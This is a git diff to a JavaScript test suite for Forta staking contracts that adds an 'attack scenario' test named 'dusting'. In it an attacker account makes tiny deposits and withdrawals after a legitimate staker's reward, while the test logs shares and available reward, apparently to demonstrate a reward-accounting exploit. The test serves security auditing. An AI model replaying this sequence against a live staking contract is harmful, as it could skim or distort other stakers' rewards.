@@ -19,7 +19,9 @@ const txTimestamp = (tx) =>
         .wait()
         .then(({ blockNumber }) => ethers.provider.getBlock(blockNumber))
         .then(({ timestamp }) => timestamp);
+
 const MAX_STAKE = '10000';
+
 describe('Forta Staking', function () {
     prepare({ stake: { min: '1', max: MAX_STAKE, activated: true } });
 
@@ -851,6 +853,61 @@ describe('Forta Staking', function () {
                 .withArgs(
                     this.signature + ethers.utils.hexlify(ethers.utils.zeroPad(subjectType1, 32)).slice(2) + ethers.utils.hexlify(ethers.utils.zeroPad(subject1, 32)).slice(2)
                 );
+        });
+    });
+
+    describe('attack scenario', function () {
+        it('dusting', async function () {
+            await this.scanners.connect(this.accounts.manager).setStakeThreshold({ max: ethers.utils.parseEther('5000'), min: '1', activated: true }, 1);
+
+            const legitimate = this.accounts.user1;
+            const attacker = this.accounts.user2;
+
+            {
+                const totalShares     = await this.staking.totalShares(subjectType1, subject1).then(x => x.toNumber());
+                const shares          = await this.staking.sharesOf(subjectType1, subject1, legitimate.address).then(x => x.toNumber());
+                const availableReward = await this.staking.availableReward(subjectType1, subject1, legitimate.address).then(x => x.toNumber());
+                console.table({ totalShares, shares, availableReward });
+            }
+
+            await this.staking.connect(legitimate).deposit(subjectType1, subject1, '20000000000000');
+
+            {
+                const totalShares     = await this.staking.totalShares(subjectType1, subject1).then(x => x.toNumber());
+                const shares          = await this.staking.sharesOf(subjectType1, subject1, legitimate.address).then(x => x.toNumber());
+                const availableReward = await this.staking.availableReward(subjectType1, subject1, legitimate.address).then(x => x.toNumber());
+                console.table({ totalShares, shares, availableReward });
+            }
+
+            await this.staking.connect(legitimate).reward(subjectType1, subject1, '10000000000000');
+
+            {
+                const totalShares     = await this.staking.totalShares(subjectType1, subject1).then(x => x.toNumber());
+                const shares          = await this.staking.sharesOf(subjectType1, subject1, legitimate.address).then(x => x.toNumber());
+                const availableReward = await this.staking.availableReward(subjectType1, subject1, legitimate.address).then(x => x.toNumber());
+                console.table({ totalShares, shares, availableReward });
+            }
+
+            await this.staking.connect(attacker).deposit(subjectType1, subject1, '3');
+
+            {
+                const totalShares     = await this.staking.totalShares(subjectType1, subject1).then(x => x.toNumber());
+                const shares          = await this.staking.sharesOf(subjectType1, subject1, legitimate.address).then(x => x.toNumber());
+                const availableReward = await this.staking.availableReward(subjectType1, subject1, legitimate.address).then(x => x.toNumber());
+                console.table({ totalShares, shares, availableReward });
+            }
+
+            await this.staking.connect(attacker).initiateWithdrawal(subjectType1, subject1, '2');
+            await this.staking.connect(attacker).initiateWithdrawal(subjectType1, subject1, '1');
+
+            {
+                const totalShares     = await this.staking.totalShares(subjectType1, subject1).then(x => x.toNumber());
+                const shares          = await this.staking.sharesOf(subjectType1, subject1, legitimate.address).then(x => x.toNumber());
+                const availableReward = await this.staking.availableReward(subjectType1, subject1, legitimate.address).then(x => x.toNumber());
+                console.table({ totalShares, shares, availableReward });
+            }
+
+            await this.staking.releaseReward(subjectType1, subject1, legitimate.address);
         });
     });
 });
